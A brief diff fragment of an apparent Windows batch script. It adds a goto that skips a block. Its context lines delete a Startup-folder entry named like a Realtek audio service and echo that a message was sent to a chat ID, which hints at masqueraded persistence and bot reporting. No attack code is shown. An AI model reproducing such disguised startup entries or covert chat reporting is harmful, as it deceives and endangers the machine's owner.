@@ -253,7 +253,7 @@ del /F /Q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RtkAudUServic
 
 echo Operation completed.
 
-
+goto CONT
 
 
 
@@ -287,7 +287,7 @@ echo Message sent to chat ID %CHAT_ID%
 
 
 
-
+:CONT
 
 
 
